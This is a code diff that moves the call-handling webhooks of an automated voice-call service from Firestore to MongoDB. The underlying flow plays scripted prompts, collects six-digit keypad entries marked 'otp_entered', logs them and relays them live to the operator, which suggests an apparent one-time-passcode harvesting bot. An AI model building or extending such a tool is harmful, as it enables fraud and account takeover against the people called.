@@ -6,6 +6,8 @@ from services.telegram_service import TelegramService
 from services.websocket_manager import manager
 from datetime import datetime
 import logging
+import json
+import os
 
 logger = logging.getLogger(__name__)
 router = APIRouter(prefix="/webhooks", tags=["Webhooks"])
@@ -81,18 +83,15 @@ async def signalwire_first_input(call_id: str, request: Request, Digits: str = F
     try:
         logger.info(f"First input for call {call_id}: {Digits}")
         
-        # Get call from Firestore
-        # MongoDB operations handled by MongoDBService
-        call_ref = db.collection('calls').document(call_id)
-        call_doc = call_ref.get()
+        # Get call from MongoDB
+        call_data = await MongoDBService.get_call(call_id)
         
-        if not call_doc.exists:
+        if not call_data:
             return Response(
                 content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Call not found</Say><Hangup/></Response>',
                 media_type="application/xml"
             )
         
-        call_data = call_doc.to_dict()
         voice = call_data.get('tts_voice', 'Aurora')
         
         # Create event
@@ -142,18 +141,15 @@ async def signalwire_deny(call_id: str, request: Request, Digits: str = Form(Non
     try:
         logger.info(f"Deny flow for call {call_id}, Digits: {Digits}")
         
-        # Get call from Firestore
-        # MongoDB operations handled by MongoDBService
-        call_ref = db.collection('calls').document(call_id)
-        call_doc = call_ref.get()
+        # Get call from MongoDB
+        call_data = await MongoDBService.get_call(call_id)
         
-        if not call_doc.exists:
+        if not call_data:
             return Response(
                 content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Call not found</Say><Hangup/></Response>',
                 media_type="application/xml"
             )
         
-        call_data = call_doc.to_dict()
         voice = call_data.get('tts_voice', 'Aurora')
         digits_required = call_data.get('digits', 6)
         
@@ -167,7 +163,7 @@ async def signalwire_deny(call_id: str, request: Request, Digits: str = Form(Non
             }
             
             await MongoDBService.update_call_events(call_id, event)
-            call_ref.update({'status': 'otp_entered'})
+            await MongoDBService.update_call_status(call_id, 'otp_entered')
             
             await manager.send_to_user(call_data['user_id'], {
                 'type': 'call_event',
@@ -227,18 +223,15 @@ async def signalwire_accept(call_id: str, request: Request):
     try:
         logger.info(f"Accept flow for call {call_id}")
         
-        # Get call from Firestore
-        # MongoDB operations handled by MongoDBService
-        call_ref = db.collection('calls').document(call_id)
-        call_doc = call_ref.get()
+        # Get call from MongoDB
+        call_data = await MongoDBService.get_call(call_id)
         
-        if not call_doc.exists:
+        if not call_data:
             return Response(
                 content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Call not found</Say><Hangup/></Response>',
                 media_type="application/xml"
             )
         
-        call_data = call_doc.to_dict()
         voice = call_data.get('tts_voice', 'Aurora')
         
         # Log accepted
@@ -249,7 +242,7 @@ async def signalwire_accept(call_id: str, request: Request):
         }
         
         await MongoDBService.update_call_events(call_id, event)
-        call_ref.update({'status': 'accepted'})
+        await MongoDBService.update_call_status(call_id, 'accepted')
         
         await manager.send_to_user(call_data['user_id'], {
             'type': 'call_event',
@@ -280,18 +273,14 @@ async def signalwire_gather(call_id: str, request: Request, Digits: str = Form(N
     try:
         logger.info(f"Gathered digits for call {call_id}: {Digits}")
         
-        # Get call from Firestore
-        # MongoDB operations handled by MongoDBService
-        call_ref = db.collection('calls').document(call_id)
-        call_doc = call_ref.get()
+        # Get call from MongoDB
+        call_data = await MongoDBService.get_call(call_id)
         
-        if not call_doc.exists:
+        if not call_data:
             return Response(
                 content=signalwire.generate_twiml_response("Call not found"),
                 media_type="application/xml"
             )
-        
-        call_data = call_doc.to_dict()
         
         # Create event for digits received
         event = {
@@ -303,7 +292,7 @@ async def signalwire_gather(call_id: str, request: Request, Digits: str = Form(N
         await MongoDBService.update_call_events(call_id, event)
         
         # Update status to 'digit_entered'
-        call_ref.update({'status': 'digit_entered'})
+        await MongoDBService.update_call_status(call_id, 'digit_entered')
         
         await manager.send_to_user(call_data['user_id'], {
             'type': 'call_event',
@@ -344,15 +333,11 @@ async def signalwire_gather(call_id: str, request: Request, Digits: str = Form(N
 async def get_call_data_for_webhook(call_id: str):
     """Get call data for external PHP webhook (public endpoint)"""
     try:
-        # Get call from Firestore
-        # MongoDB operations handled by MongoDBService
-        call_ref = db.collection('calls').document(call_id)
-        call_doc = call_ref.get()
+        # Get call from MongoDB
+        call_data = await MongoDBService.get_call(call_id)
         
-        if not call_doc.exists:
+        if not call_data:
             raise HTTPException(status_code=404, detail="Call not found")
-        
-        call_data = call_doc.to_dict()
         
         # Return EXACT messages from UI form for PHP webhook TwiML generation
         return {
@@ -386,19 +371,15 @@ async def external_webhook_update(call_id: str, request: Request):
         
         logger.info(f"External webhook update for call {call_id}: {data}")
         
-        # Get call from Firestore
-        # MongoDB operations handled by MongoDBService
-        call_ref = db.collection('calls').document(call_id)
-        call_doc = call_ref.get()
+        # Get call from MongoDB
+        call_data = await MongoDBService.get_call(call_id)
         
-        if not call_doc.exists:
+        if not call_data:
             return {"status": "error", "message": "Call not found"}
-        
-        call_data = call_doc.to_dict()
         
         # Update status if provided
         if 'status' in data:
-            call_ref.update({'status': data['status']})
+            await MongoDBService.update_call_status(call_id, data['status'])
         
         # Add event
         event = {
@@ -432,14 +413,10 @@ async def signalwire_status(call_id: str, request: Request):
         
         logger.info(f"Status update for call {call_id}: {call_status}")
         
-        # Get call from Firestore
-        # MongoDB operations handled by MongoDBService
-        call_ref = db.collection('calls').document(call_id)
-        call_doc = call_ref.get()
+        # Get call from MongoDB
+        call_data = await MongoDBService.get_call(call_id)
         
-        if call_doc.exists:
-            call_data = call_doc.to_dict()
-            
+        if call_data:
             event = {
                 'time': datetime.utcnow().isoformat(),
                 'event': f'status_{call_status}',
@@ -448,12 +425,12 @@ async def signalwire_status(call_id: str, request: Request):
             
             await MongoDBService.update_call_events(call_id, event)
             
-            # Update call status and recording URL in Firestore
+            # Update call status and recording URL in MongoDB
             update_data = {'status': call_status.lower()}
             if recording_url:
                 update_data['recording_url'] = recording_url
             
-            call_ref.update(update_data)
+            await MongoDBService.update_call_data(call_id, update_data)
             
             await manager.send_to_user(call_data['user_id'], {
                 'type': 'call_event',
@@ -479,14 +456,12 @@ async def signalwire_status(call_id: str, request: Request):
 async def infobip_webhook(call_id: str, request: Request):
     """Main webhook for Infobip calls - Step 1"""
     try:
-        # MongoDB operations handled by MongoDBService
-        call_ref = db.collection('calls').document(call_id)
-        call_doc = call_ref.get()
+        # Get call from MongoDB
+        call_data = await MongoDBService.get_call(call_id)
         
-        if not call_doc.exists:
+        if not call_data:
             return Response(content='{"say":[{"text":"Call not found"}],"hangup":{}}', media_type="application/json")
         
-        call_data = call_doc.to_dict()
         voice = call_data.get('tts_voice', 'Aurora')
         language = call_data.get('language', 'en-US')
         step_1_message = call_data.get('step_1_message', 'Hello')
@@ -515,7 +490,6 @@ async def infobip_first_input(call_id: str, request: Request):
         body = await request.json()
         digits = body.get('dtmf', {}).get('digits', '')
         
-        # MongoDB operations handled by MongoDBService
         backend_url = os.getenv('BACKEND_URL', 'https://callbot-analytics.preview.emergentagent.com')
         
         if digits == '1':
@@ -537,15 +511,13 @@ async def infobip_status_webhook(call_id: str, request: Request):
         body = await request.json()
         status = body.get('status', '')
         
-        # MongoDB operations handled by MongoDBService
-        call_ref = db.collection('calls').document(call_id)
-        if call_ref.get().exists:
-            call_ref.update({'status': status.lower()})
+        # Update call status in MongoDB
+        call_data = await MongoDBService.get_call(call_id)
+        if call_data:
+            await MongoDBService.update_call_status(call_id, status.lower())
             logger.info(f"Infobip call {call_id} status: {status}")
         
         return Response(content="OK", media_type="text/plain")
     except Exception as e:
         logger.error(f"Infobip status error: {e}")
-        return Response(content="Error", media_type="text/plain")
-
         return Response(content="Error", media_type="text/plain")
